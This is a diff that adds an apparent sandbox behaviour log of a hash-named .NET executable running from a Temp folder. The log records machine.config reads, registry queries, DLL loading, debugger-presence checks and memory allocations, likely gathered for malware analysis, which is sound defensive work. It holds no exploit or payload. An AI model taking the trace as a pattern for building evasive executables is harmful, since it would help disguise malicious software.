+        <sectionGroup name="system.net" type="System.Net.Configuration.NetSectionGroup, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="authenticationModules" type="System.Net.Configuration.AuthenticationModulesSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="connectionManagement" type="System.Net.Configuration.ConnectionManagementSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="defaultProxy" type="System.Net.Configuration.DefaultProxySection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <sectionGroup name="mailSettings" type="System.Net.Configuration.MailSettingsSectionGroup, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+                <section name="smtp" type="System.Net.Configuration.SmtpSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            </sectionGroup>
+            <section name="requestCaching" type="System.Net.Configuration.RequestCachingSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="settings" type="System.Net.Configuration.SettingsSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="webRequestModules" type="System.Net.Configuration.WebRequestModulesSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        </sectionGroup>
+        <sectionGroup name="system.runtime.serialization" type="System.Runtime.Serialization.Configuration.SerializationSectionGroup, System.Runtime.Serialization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="dataContractSerializer" type="System.Runtime.Serialization.Configuration.DataContractSerializerSection, System.Runtime.Serialization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+        </sectionGroup>
+        <sectionGroup name="system.serviceModel" type="System.ServiceModel.Configuration.ServiceModelSectionGroup, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="behaviors" type="System.ServiceModel.Configuration.BehaviorsSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="bindings" type="System.ServiceModel.Configuration.BindingsSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="client" type="System.ServiceModel.Configuratio#0x0000007c#6135|,0,1542888185.468625
+NtReadFile,|0#/>
+            <section name="routing" type="System.ServiceModel.Routing.Configuration.RoutingSection, System.ServiceModel.Routing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
+            <section name="tracking" type="System.ServiceModel.Activities.Tracking.Configuration.TrackingSection, System.ServiceModel.Activities, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
+        </sectionGroup>
+        <sectionGroup name="system.serviceModel.activation" type="System.ServiceModel.Activation.Configuration.ServiceModelActivationSectionGroup, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="diagnostics" type="System.ServiceModel.Activation.Configuration.DiagnosticSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="net.pipe" type="System.ServiceModel.Activation.Configuration.NetPipeSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+            <section name="net.tcp" type="System.ServiceModel.Activation.Configuration.NetTcpSection, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
+        </sectionGroup>
+        <sectionGroup name="system.transactions" type="System.Transactions.Configuration.TransactionsSectionGroup, System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Custom=null">
+           <section name="defaultSettings" type="System.Transactions.Configuration.DefaultSettingsSection, System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Custom=null" />
+           <section name="machineSettings" type="System.Transactions.Configuration.MachineSettingsSection, System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Custom=null" allowDefinition="MachineOnly" allowExeDefinition="MachineOnly"/>
+        </sectionGroup>
+        <sectionGroup name="system.web" type="System.Web.Configuration.SystemWebSectionGroup, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
+            <section name="anonymousIdentification" type="System.Web.Configuration.AnonymousIdentificationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="authentication" type="System.Web.Configuration.AuthenticationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="authorization" type="System.Web.Configuration.AuthorizationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="browserCaps" type="System.Web.Configuration.HttpCapabilitiesSectionHandler, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="clientTarget" type="System.Web.Configuration.ClientTargetSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="compilation" type="System.Web.Configuration.CompilationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" requirePermission="false" />
+            <section name="customErrors" type="System.Web.Configuration.CustomErrorsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="deployment" type="System.Web.Configuration.DeploymentSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineOnly" />
+            <section name="deviceFilters" type="System.Web.Mobile.DeviceFiltersSection, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="fullTrustAssemblies" type="System.Web.Configuration.FullTrustAssembliesSection, System.Web, Version=4.0.0.0, Culture#0x0000007c#4097|,0,1542888185.468625
+NtReadFile,|0#neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="globalization" type="System.Web.Configuration.GlobalizationSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="healthMonitoring" type="System.Web.Configuration.HealthMonitoringSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="hostingEnvironment" type="System.Web.Configuration.HostingEnvironmentSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="httpCookies" type="System.Web.Configuration.HttpCookiesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="httpHandlers" type="System.Web.Configuration.HttpHandlersSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="httpModules" type="System.Web.Configuration.HttpModulesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="httpRuntime" type="System.Web.Configuration.HttpRuntimeSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="identity" type="System.Web.Configuration.IdentitySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="machineKey" type="System.Web.Configuration.MachineKeySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="membership" type="System.Web.Configuration.MembershipSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="mobileControls" type="System.Web.UI.MobileControls.MobileControlsSection, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="pages" type="System.Web.Configuration.PagesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" requirePermission="false" />
+            <section name="partialTrustVisibleAssemblies" type="System.Web.Configuration.PartialTrustVisibleAssembliesSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="processModel" type="System.Web.Configuration.ProcessModelSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineOnly" allowLocation="false" />
+            <section name="profile" type="System.Web.Configuration.ProfileSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="protocols" type="System.Web.Configuration.ProtocolsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToWebRoot" />
+            <section name="roleManager" type="System.Web.Configuration.RoleManagerSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="securityPolicy" type="System.Web.Configuration.SecurityPolicySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="sessionPageState" type="System.Web.Configuration.SessionPageStateSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="sessionState" type="System.Web.Configuration.SessionStateSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />#0x0000007c#4098|,0,1542888185.468625
+NtReadFile,|0#            <section name="siteMap" type="System.Web.Configuration.SiteMapSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="trace" type="System.Web.Configuration.TraceSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="trust" type="System.Web.Configuration.TrustSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="urlMappings" type="System.Web.Configuration.UrlMappingsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            <section name="webControls" type="System.Web.Configuration.WebControlsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="webParts" type="System.Web.Configuration.WebPartsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="webServices" type="System.Web.Services.Configuration.WebServicesSection, System.Web.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <section name="xhtmlConformance" type="System.Web.Configuration.XhtmlConformanceSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+            <sectionGroup name="caching" type="System.Web.Configuration.SystemWebCachingSectionGroup, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
+                <section name="cache" type="System.Web.Configuration.CacheSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+                <section name="outputCache" type="System.Web.Configuration.OutputCacheSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+                <section name="outputCacheSettings" type="System.Web.Configuration.OutputCacheSettingsSection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+                <section name="sqlCacheDependency" type="System.Web.Configuration.SqlCacheDependencySection, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+            </sectionGroup>
+        </sectionGroup>
+        <sectionGroup name="system.web.extensions" type="System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+            <sectionGroup name="scripting" type="System.Web.Configuration.ScriptingSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+                <section name="scriptResourceHandler" type="System.Web.Configuration.ScriptingScriptResourceHandlerSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" requirePermission="false" allowDefinition="MachineToApplication"/>
+                <sectionGroup name="webServices" type="System.Web.Configuration.ScriptingWebServicesSectionGroup, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+                    <section name="jsonSerialization" type="System.Web.Configuration.ScriptingJsonSerializationSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" requirePermission="false" allowDefinition="Everywhere" />
+                    <section name="profileService" type="System.Web.Configuration.ScriptingProfileServiceSection, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" requirePermission="false" allowDefinition="MachineToApplication" />
+                    <section name="authenticatio#0x0000007c#7976|,0,1542888185.468625
+NtClose,0x0000007c,0,1542888185.468625
+NtCreateFile,128#1#1#96#4294967295#0x00000000#0x80100080#\??\C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe.config#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe.config,3221225524,1542888185.468625
+SetErrorMode,32769,32775,1542888185.468625
+LdrLoadDll,0#ntdll#0#ntdll#0x77a30000,0,1542888185.468625
+SetErrorMode,32775,32773,1542888185.468625
+LdrGetProcedureAddress,RtlUnwind#ntdll#0x77a4fa38#0#0x77a30000,0,1542888185.468625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.468625
+LdrGetProcedureAddress,IsWow64Process#KERNEL32#0x760f5476#0#0x760b0000,0,1542888185.468625
+RegOpenKeyExW,0x0000007c#Software\Microsoft\Fusion#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion#0x80000002#0,0,1542888185.468625
+RegOpenKeyExW,0x00000000#Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#0x80000002#0,2,1542888185.468625
+GetFileAttributesW,4294967295#C:\Windows\Microsoft.NET\Framework\v4.0.30319\fusion.localgac#C:\Windows\Microsoft.NET\Framework\v4.0.30319\fusion.localgac,4294967295,1542888185.468625
+RegOpenKeyExW,0x00000080#Software\Microsoft\Fusion#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion#0x80000002#0,0,1542888185.468625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\CacheLocation#0x00000080#CacheLocation#0#,2,1542888185.468625
+RegCloseKey,0x00000080,0,1542888185.468625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.468625
+LdrGetProcedureAddress,GetSystemWindowsDirectoryW#KERNEL32#0x760fee93#0#0x760b0000,0,1542888185.468625
+GetSystemWindowsDirectoryW,C:\Windows,10,1542888185.468625
+RegOpenKeyExW,0x00000080#Software\Microsoft\Fusion#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Fusion#0x80000002#0,0,1542888185.468625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\DownloadCacheQuotaInKB#0x00000080#DownloadCacheQuotaInKB#0#,2,1542888185.468625
+RegOpenKeyExW,0x00000000#Software\Microsoft\Fusion#0x00020019#HKEY_CURRENT_USER\Software\Microsoft\Fusion#0x80000001#0,2,1542888185.468625
+RegCloseKey,0x00000080,0,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\EnableLog#0x0000007c#EnableLog#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\LoggingLevel#0x0000007c#LoggingLevel#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\ForceLog#0x0000007c#ForceLog#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\LogFailures#0x0000007c#LogFailures#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\LogResourceBinds#0x0000007c#LogResourceBinds#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\FileInUseRetryAttempts#0x0000007c#FileInUseRetryAttempts#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\FileInUseMillisecondsBetweenRetries#0x0000007c#FileInUseMillisecondsBetweenRetries#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\UseLegacyIdentityFormat#0x0000007c#UseLegacyIdentityFormat#0#,2,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\DisableMSIPeek#0x0000007c#DisableMSIPeek#0#,2,1542888185.484625
+RegCloseKey,0x0000007c,0,1542888185.484625
+RegOpenKeyExW,0x0000007c#Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options#0x80000002#0,0,1542888185.484625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DevOverrideEnable#0x0000007c#DevOverrideEnable#0#,2,1542888185.484625
+RegCloseKey,0x0000007c,0,1542888185.484625
+LdrGetDllHandle,0#advapi32#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,AllocateAndInitializeSid#ADVAPI32#0x777440e6#0#0x77730000,0,1542888185.484625
+NtOpenProcess,1776#0x00000400#0x0000007c,0,1542888185.484625
+LdrGetProcedureAddress,OpenProcessToken#ADVAPI32#0x77744304#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,GetTokenInformation#ADVAPI32#0x7774431c#0#0x77730000,0,1542888185.484625
+NtClose,0x0000007c,0,1542888185.484625
+NtClose,0x00000080,0,1542888185.484625
+LdrGetProcedureAddress,InitializeAcl#ADVAPI32#0x777445cd#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,AddAccessAllowedAce#ADVAPI32#0x77744176#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,FreeSid#ADVAPI32#0x7774412e#0#0x77730000,0,1542888185.484625
+NtCreateSection,4#0x00000080#0x00000078#0x00000000#0x000f0007#Global\Cor_Private_IPCBlock_v4_1776,0,1542888185.484625
+NtMapViewOfSection,0#0#1776#4096#0xffffffff#0x00000080#0x00400000##0#4,0,1542888185.484625
+LdrGetDllHandle,0#advapi32#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,AllocateAndInitializeSid#ADVAPI32#0x777440e6#0#0x77730000,0,1542888185.484625
+NtOpenProcess,1776#0x00000400#0x0000007c,0,1542888185.484625
+LdrGetProcedureAddress,OpenProcessToken#ADVAPI32#0x77744304#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,GetTokenInformation#ADVAPI32#0x7774431c#0#0x77730000,0,1542888185.484625
+NtClose,0x0000007c,0,1542888185.484625
+NtClose,0x00000084,0,1542888185.484625
+LdrGetProcedureAddress,InitializeAcl#ADVAPI32#0x777445cd#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,AddAccessAllowedAce#ADVAPI32#0x77744176#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,FreeSid#ADVAPI32#0x7774412e#0#0x77730000,0,1542888185.484625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,AddSIDToBoundaryDescriptor#KERNEL32#0x760e66b9#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,CreateBoundaryDescriptorW#KERNEL32#0x760e6687#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,CreatePrivateNamespaceW#KERNEL32#0x760e3fb5#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,OpenPrivateNamespaceW#KERNEL32#0x760e2ea2#0#0x760b0000,0,1542888185.484625
+LdrGetDllHandle,0#advapi32#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,AllocateAndInitializeSid#ADVAPI32#0x777440e6#0#0x77730000,0,1542888185.484625
+NtOpenProcess,1776#0x00000400#0x00000084,0,1542888185.484625
+LdrGetProcedureAddress,OpenProcessToken#ADVAPI32#0x77744304#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,GetTokenInformation#ADVAPI32#0x7774431c#0#0x77730000,0,1542888185.484625
+NtClose,0x00000084,0,1542888185.484625
+NtClose,0x0000007c,0,1542888185.484625
+LdrGetProcedureAddress,InitializeAcl#ADVAPI32#0x777445cd#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,AddAccessAllowedAce#ADVAPI32#0x77744176#0#0x77730000,0,1542888185.484625
+LdrGetProcedureAddress,FreeSid#ADVAPI32#0x7774412e#0#0x77730000,0,1542888185.484625
+NtCreateSection,4#0x00000084#0x0000007c#0x00000000#0x000f0007#Cor_SxSPublic_IPCBlock,0,1542888185.484625
+NtMapViewOfSection,0#0#1776#65536#0xffffffff#0x00000084#0x00410000##0#4,0,1542888185.484625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,DeleteBoundaryDescriptor#KERNEL32#0x77a85661#0#0x760b0000,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x00420000#8192#1#0,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x00420000#4096#4#0,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,FlsSetValue#KERNEL32#0x76106c67#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,FlsGetValue#KERNEL32#0x76106c4f#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,FlsAlloc#KERNEL32#0x760ff189#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,FlsFree#KERNEL32#0x7610b7c5#0#0x760b0000,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x00430000#8192#1#0,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x00440000#8192#1#0,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x00660000#8192#1#0,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x00670000#8192#1#0,0,1542888185.484625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,WerRegisterRuntimeExceptionModule#KERNEL32#0x76147c4f#0#0x760b0000,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00680000#12288#4#0,0,1542888185.484625
+NtCreateMutant,0##0x00000090#0x001f0001,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00690000#12288#4#0,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#1507328#0xffffffff#0x01480000#8192#64#0,0,1542888185.484625
+NtFreeVirtualMemory,1245184#32768#1776#0x01480000#0xffffffff,0,1542888185.484625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x015b0000#4096#64#0,0,1542888185.484625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,RaiseException#KERNEL32#0x760ef162#0#0x760b0000,0,1542888185.484625
+IsDebuggerPresent,,0,1542888185.484625
+NtCreateMutant,1##0x000000b8#0x001f0001,0,1542888185.484625
+CreateThread,0x00000000#0x692a741c#328#4#0,188,1542888185.484625
+NtResumeThread,1#1776#0x000000bc,0,1542888185.484625
+IsDebuggerPresent,,0,1542888185.484625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,AddVectoredExceptionHandler#KERNEL32#0x77a3f784#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,RemoveVectoredExceptionHandler#KERNEL32#0x77aaad26#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,AddVectoredContinueHandler#KERNEL32#0x77a55515#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,RemoveVectoredContinueHandler#KERNEL32#0x77ad3cd9#0#0x760b0000,0,1542888185.484625
+RtlAddVectoredExceptionHandler,1,4642416,1542888185.484625
+RtlAddVectoredContinueHandler,1,4642440,1542888185.484625
+LdrGetDllHandle,0#mscoree.dll#0x72a90000,0,1542888185.484625
+LdrGetProcedureAddress,#MSCOREE#0x72a98017#24#0x72a90000,0,1542888185.484625
+LdrGetProcedureAddress,#mscoreei#0x6a624470#24#0x6a620000,0,1542888185.484625
+SetUnhandledExceptionFilter,,0,1542888185.484625
+NtDuplicateObject,0#1776#2#0x000000c0#0xfffffffe#0x00000000#0xffffffff#0xffffffff#1776,0,1542888185.484625
+GetSystemInfo,1,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x002cd000#4096#260#0,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#1028096#0xffffffff#0x001d1000#4096#4#0,0,1542888185.484625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetDllHandle,0#ntdll.dll#0x77a30000,0,1542888185.484625
+LdrGetProcedureAddress,SetSystemFileCacheSize#KERNEL32#0x76147ec4#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,NtSetSystemInformation#ntdll#0x77a76788#0#0x77a30000,0,1542888185.484625
+LdrGetProcedureAddress,PrivIsDllSynchronizationHeld#KERNEL32#0x692a5ba0#0#0x760b0000,3221225785,1542888185.484625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x0043a000#4096#64#0,0,1542888185.484625
+NtProtectVirtualMemory,0#0#1776#8192#0xffffffff#0x69142000#64#0,0,1542888185.484625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x00432000#4096#64#0,0,1542888185.484625
+LdrGetDllHandle,0#Kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,GetWriteWatch#KERNEL32#0x761480ef#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,ResetWriteWatch#KERNEL32#0x76148128#0#0x760b0000,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x01330000#2105344#4#0,0,1542888185.484625
+NtFreeVirtualMemory,65536#32768#1776#0x01330000#0xffffffff,0,1542888185.484625
+LdrGetDllHandle,0#Kernel32.dll#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,CreateMemoryResourceNotification#KERNEL32#0x760f2dfc#0#0x760b0000,0,1542888185.484625
+LdrGetProcedureAddress,QueryMemoryResourceNotification#KERNEL32#0x76148160#0#0x760b0000,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#33554432#0xffffffff#0x018f0000#2105344#4#0,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#655360#0xffffffff#0x01360000#2109440#4#0,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x018f0000#4096#4#0,0,1542888185.484625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x028f0000#4096#4#0,0,1542888185.484625
